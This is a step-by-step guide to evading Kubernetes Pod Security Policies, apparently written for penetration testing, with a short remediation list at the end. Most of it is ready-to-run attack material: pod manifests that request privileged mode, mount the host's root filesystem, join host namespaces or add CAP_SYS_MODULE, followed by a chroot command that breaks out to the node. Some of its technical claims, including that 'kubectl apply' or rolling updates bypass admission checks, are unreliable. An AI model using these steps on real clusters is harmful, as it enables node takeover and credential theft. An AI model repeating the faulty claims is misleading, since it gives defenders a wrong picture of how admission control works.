
# Kubernetes Pod Security Policy (PSP) Evasion

## 1. Overview

This document outlines methods for evading Kubernetes Pod Security Policies (PSPs). PSPs are cluster-level resources that control security-sensitive aspects of pod specification, such as running as root, using host networking, or accessing host paths. Successful evasion allows an attacker to bypass these restrictions, potentially leading to privilege escalation, container breakouts, and compromise of the entire cluster.

**Attack Vector Description:**

An attacker attempts to create or modify a pod that would normally be blocked by an existing PSP. They achieve this by exploiting misconfigurations in PSPs, using default service accounts with overly permissive permissions, or leveraging vulnerabilities in Kubernetes itself (though this document focuses on configuration weaknesses). The attack focuses on creating pods that violate defined security constraints, bypassing checks intended to prevent risky operations.

**Potential Impact and Consequences:**

*   **Container Breakout:** Running a pod with privileged access (e.g., `privileged: true`, hostPath mounts) can allow an attacker to break out of the container and gain access to the underlying node.
*   **Node Compromise:** Once on the node, the attacker can access sensitive data, modify system configurations, and potentially pivot to other nodes in the cluster.
*   **Cluster-Wide Compromise:** With access to multiple nodes or the Kubernetes API server itself, the attacker can compromise the entire cluster, gaining control over all workloads and data.
*   **Data Exfiltration:** A compromised pod can be used to exfiltrate sensitive data stored within the cluster.
*   **Denial of Service:** By exhausting resources or disrupting critical services, the attacker can cause a denial of service to legitimate users.

**Risk Level Assessment:**

*   **Critical:** Successful PSP evasion often leads to full cluster compromise, making this a critical risk.

**Technical Explanation:**

PSPs function as admission controllers, intercepting pod creation and update requests. They evaluate the pod specification against a set of defined policies. If a pod violates a policy, the admission controller denies the request. The vulnerability arises when:

1.  **PSPs are not properly configured:** For example, a PSP might be overly permissive, allowing pods to run as root or use host namespaces without restriction.
2.  **Default configurations are exploited:** The default service account might have sufficient permissions to create or modify pods, bypassing the intended restrictions.
3.  **Misconfigured Role-Based Access Control (RBAC):** Users or service accounts have excessive permissions that allow them to bind to PSPs in unexpected ways, effectively circumventing intended restrictions.
4.  **`kubectl apply -f` vs. `kubectl create -f` differences:** Using `kubectl apply` can update existing resources and introduce changes not caught by initial admission controllers.

**Prerequisites and Conditions Needed:**

*   Access to a Kubernetes cluster with at least one PSP enabled.
*   Sufficient RBAC permissions to create/modify pods in a namespace.  Ideally, the user should *not* have direct `create` permission on pods, but be able to create other objects that could indirectly create a pod (e.g. Deployment, ReplicaSet).
*   Knowledge of Kubernetes concepts, including pods, deployments, RBAC, and PSPs.
*   The `kubectl` command-line tool configured to access the target cluster.

## 2. Validation and Exploitation Steps

This section outlines the steps to validate and exploit potential PSP evasion scenarios.

**Step 1: Identify Existing PSPs and RBAC**

First, list all PSPs in the cluster and examine their configurations. Then, inspect RBAC rules to determine what service accounts or users have the ability to bind to these PSPs.

```bash
kubectl get psp
```

**Explanation:** This command lists all Pod Security Policies in the cluster. Examining the output reveals the names of available PSPs, which you'll use to inspect them further.

**Expected Output:** A list of PSPs, e.g., `restricted`, `privileged`.

```bash
kubectl get psp <psp_name> -o yaml
```

**Explanation:** Replace `<psp_name>` with the name of a PSP from the previous output (e.g., `restricted`). This command retrieves the YAML definition of the specified PSP, allowing you to examine its configuration.

**Expected Output:** The YAML configuration of the specified PSP. Look for settings related to:

*   `privileged`: Whether privileged containers are allowed.
*   `hostNetwork`: Whether host networking is allowed.
*   `hostPID`, `hostIPC`: Whether host PID, IPC namespaces are allowed.
*   `volumes`: Allowed volume types.
*   `runAsUser`: Allowed user IDs.
*   `seLinux`: SElinux options
*   `supplementalGroups`, `fsGroup`: Supplemental and filesystem group options

**Why:** Understanding the existing PSPs is crucial for identifying potential evasion strategies. Knowing what restrictions are in place helps to craft a pod that violates those restrictions in a way that slips through the admission controller.

```bash
kubectl get rolebinding --all-namespaces -o yaml | grep psp.kubernetes.io
kubectl get clusterrolebinding -o yaml | grep psp.kubernetes.io
```

**Explanation:** These commands search for RoleBindings and ClusterRoleBindings that grant permissions related to Pod Security Policies. They help identify which service accounts or users have the ability to use specific PSPs.

**Expected Output:** YAML output containing RoleBindings or ClusterRoleBindings with `psp.kubernetes.io` in the `apiGroups` field.  This shows which service accounts or users can bind to which PSPs.

**Why:** Mapping users/service accounts to PSPs is essential. If a vulnerable service account is found bound to an overly permissive PSP (or incorrectly bound), this opens an evasion path.

**Step 2: Identify a Target Namespace and Service Account**

Select a namespace where you have sufficient RBAC permissions to create deployments or other workload objects. Determine which service account will be used by the pods created in that namespace. This is often the default service account for the namespace.

```bash
kubectl config view | grep current-context
```

**Explanation:**  Helps identify the Kubernetes context you're currently working in.  This is important when interacting with multiple clusters.

**Expected Output:** The name of the current Kubernetes context.

```bash
kubectl get namespace <namespace_name> -o yaml
```

**Explanation:** Replace `<namespace_name>` with the name of the namespace you will be working in (e.g., `default`). This command retrieves the YAML definition of the specified namespace, which can reveal default settings.

**Expected Output:** The YAML configuration of the namespace. This might show specific annotations that could influence PSP behavior.

```bash
kubectl get serviceaccount default -n <namespace_name> -o yaml
```

**Explanation:** Replace `<namespace_name>` with the target namespace (e.g., `default`). This command retrieves the YAML definition of the default service account in that namespace.

**Expected Output:** The YAML configuration of the default service account, including any associated secrets.

**Why:** The default service account is often used by pods unless explicitly specified otherwise. If this service account is associated with a permissive PSP (either directly or indirectly through RBAC), it becomes a prime candidate for evasion.

**Step 3: Attempt PSP Evasion with `privileged: true`**

Try to create a pod with the `privileged: true` security context.  This is a common way to attempt to break out of containers. If the PSP blocks it, proceed to step 4.

```yaml
# privileged-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  containers:
  - name: privileged-container
    image: busybox:latest
    securityContext:
      privileged: true
    command: ["sleep", "3600"]
```

```bash
kubectl apply -f privileged-pod.yaml -n <namespace_name>
```

**Explanation:** This creates a pod with the `privileged: true` security context.  This pod configuration directly requests a high level of privilege. Replace `<namespace_name>` with the target namespace. `kubectl apply` is used here to allow for updates in case of later exploitation attempts, where previous attempts failed.

**Expected Output:**

*   **If successful (PSP Evasion):**  The pod will be created and enter the `Running` state.
*   **If blocked:** An error message indicating that the pod violates the PSP, specifically due to `privileged: true`.

**Why:** This tests the most basic restriction.  If it succeeds, the PSP is severely misconfigured.

**Step 4: Evasion via HostPath Mounts**

If the PSP restricts `privileged: true`, try to mount host paths into the container.  This allows access to the underlying node's filesystem, which can be used to escalate privileges.

```yaml
# hostpath-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-pod
spec:
  containers:
  - name: hostpath-container
    image: busybox:latest
    volumeMounts:
    - name: host-root
      mountPath: /host-root
    command: ["sleep", "3600"]
  volumes:
  - name: host-root
    hostPath:
      path: /
```

```bash
kubectl apply -f hostpath-pod.yaml -n <namespace_name>
```

**Explanation:** This creates a pod that mounts the root directory of the host node (`/`) into the container at `/host-root`. This gives the container access to the entire host filesystem.

**Expected Output:**

*   **If successful (PSP Evasion):** The pod will be created and enter the `Running` state.
*   **If blocked:** An error message indicating that the pod violates the PSP, specifically due to the `hostPath` volume.

**Why:** Mounting `hostPath` is a common technique for container breakouts.  If the PSP doesn't properly restrict it, it's a critical vulnerability.

**Step 5: Evasion via Host Network, PID, and IPC Namespaces**

Attempt to create a pod that utilizes the host's network, PID, and IPC namespaces.

```yaml
# hostns-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostns-pod
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: hostns-container
    image: busybox:latest
    command: ["sleep", "3600"]
```

```bash
kubectl apply -f hostns-pod.yaml -n <namespace_name>
```

**Explanation:** This creates a pod configured to use the host's network, PID, and IPC namespaces.  This grants the container direct access to processes and network interfaces on the host.

**Expected Output:**

*   **If successful (PSP Evasion):** The pod will be created and enter the `Running` state.
*   **If blocked:** An error message indicating that the pod violates the PSP, specifically due to `hostNetwork`, `hostPID`, or `hostIPC`.

**Why:** Using host namespaces offers high privilege. Successfully using this bypass signifies a loosely configured PSP.

**Step 6: Evasion via Allowed Capabilities and `securityContext.capabilities`**

If the PSP restricts `privileged: true` and host namespaces, try to grant specific capabilities to the container. PSPs often allow certain capabilities while restricting others. Find out the allowed capabilities and then see if you can create a pod with them.

First, determine which capabilities are allowed by the PSP. Examine the output of the `kubectl get psp <psp_name> -o yaml` command from Step 1, and look for the `allowedCapabilities` field. If this field exists and contains a list of capabilities, those are the capabilities the PSP allows.

If `allowedCapabilities` isn't set, the PSP is likely allowing the default set of capabilities. You can check the Kubernetes documentation to determine the default set of capabilities.

Now, attempt to create a pod that utilizes those capabilities.  Specifically, `CAP_SYS_MODULE` is a high-risk capability.

```yaml
# capsysmodule-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: capsysmodule-pod
spec:
  containers:
  - name: capsysmodule-container
    image: busybox:latest
    securityContext:
      capabilities:
        add: ["CAP_SYS_MODULE"]
    command: ["sleep", "3600"]
```

```bash
kubectl apply -f capsysmodule-pod.yaml -n <namespace_name>
```

**Explanation:** This creates a pod with the `CAP_SYS_MODULE` capability.  This capability allows the container to load and unload kernel modules, which can be used for privilege escalation.

**Expected Output:**

*   **If successful (PSP Evasion):** The pod will be created and enter the `Running` state.
*   **If blocked:** An error message indicating that the pod violates the PSP, specifically due to the `CAP_SYS_MODULE` capability.

**Why:** Many PSPs incorrectly whitelist `CAP_SYS_MODULE` without realizing the risk.

**Step 7: Evasion via Updating a Deployment (Rolling Updates Bypass)**

Sometimes, PSPs are enforced more strictly during pod creation than during updates. Attempt to create a "harmless" deployment, then update it to use a privileged security context.

First create a basic deployment:

```yaml
# initial-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: initial-deployment
spec:
  replicas: 1
  selector:
    matchLabels:
      app: initial-deployment
  template:
    metadata:
      labels:
        app: initial-deployment
    spec:
      containers:
      - name: initial-container
        image: busybox:latest
        command: ["sleep", "3600"]
```

```bash
kubectl apply -f initial-deployment.yaml -n <namespace_name>
```

**Explanation:** Creates a basic deployment with a simple pod. This should pass initial PSP checks.

**Expected Output:** The deployment is created successfully.

Next, update the deployment to use a privileged security context:

```yaml
# updated-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: initial-deployment
spec:
  replicas: 1
  selector:
    matchLabels:
      app: initial-deployment
  template:
    metadata:
      labels:
        app: initial-deployment
    spec:
      containers:
      - name: updated-container
        image: busybox:latest
        securityContext:
          privileged: true
        command: ["sleep", "3600"]
```

```bash
kubectl apply -f updated-deployment.yaml -n <namespace_name>
```

**Explanation:** This updates the existing deployment with a privileged security context in the container specification. `kubectl apply` is used here, which can sometimes bypass initial admission checks.

**Expected Output:**

*   **If successful (PSP Evasion):** The deployment is updated, and a new privileged pod is created.
*   **If blocked:** An error message indicating that the pod violates the PSP, specifically due to `privileged: true`.

**Why:** Rolling updates can sometimes bypass PSP restrictions due to less strict enforcement during updates.

**Step 8: Exploitation (After Successful Evasion)**

Once a method for evading the PSP has been found, proceed with exploitation. The specific steps will depend on the evasion method used, but common techniques include:

*   **For `privileged: true`:** Run commands to break out of the container and gain access to the host.  For example, mounting the host filesystem and chrooting into it.
*   **For `hostPath` mounts:** Access sensitive files on the host filesystem, such as SSH keys, credentials, or configuration files.
*   **For host namespaces:** Access processes and network interfaces on the host, potentially allowing you to monitor network traffic, inject code into processes, or steal credentials.
*   **For `CAP_SYS_MODULE`:**  Load a malicious kernel module to gain root access on the host.

**Example (After successful `hostPath` evasion):**

```bash
kubectl exec -it hostpath-pod -n <namespace_name> -- chroot /host-root
```

**Explanation:**  This command enters the container and uses `chroot` to change the root directory to `/host-root`, which is where the host's filesystem is mounted.

**Expected Output:** You should now be in the root directory of the host node. You can verify this by running `pwd`, which should output `/`.

**Why:**  Now that you are in the host's filesystem, you can access and modify files, potentially leading to full node compromise. You can search for sensitive files like SSH keys or configuration files.

**Remediation Recommendations:**

*   **Principle of Least Privilege:** Grant users and service accounts only the minimum permissions required to perform their tasks. Avoid overly permissive PSPs and RBAC rules.
*   **Strict PSP Enforcement:** Ensure that PSPs are strictly enforced and that there are no gaps in coverage. Consider using a tool like Kyverno or OPA/Gatekeeper for more flexible and robust policy enforcement.
*   **Regular Security Audits:** Conduct regular security audits of your Kubernetes cluster to identify and address misconfigurations and vulnerabilities.
*   **Use a Security Dashboard:** Use a security dashboard such as Kubescape, Snyk, or Aqua Security to get an overview of the security posture of your cluster, and to identify misconfigurations.
*   **Principle of Defence-in-depth:** Apply multiple layers of security to protect your cluster. This includes PSPs, RBAC, network policies, and other security controls.
*   **Monitor and Alert:** Implement monitoring and alerting to detect suspicious activity in your cluster. This can help you identify and respond to attacks in a timely manner.
*   **Keep Kubernetes Updated:** Ensure you are running the latest version of Kubernetes, as well as any patched version of the components you are running to protect against known vulnerabilities.
*   **Disallow mounting of `hostPath`:**  Unless absolutely necessary, prevent hostPath volumes by blocking them in the PSP.
*   **Limit allowed capabilities:**  Carefully review and limit the set of allowed capabilities. Avoid allowing potentially dangerous capabilities like `CAP_SYS_MODULE`.
*   **Use network policies:** Network policies can help to restrict network traffic between pods, limiting the impact of a compromised pod.
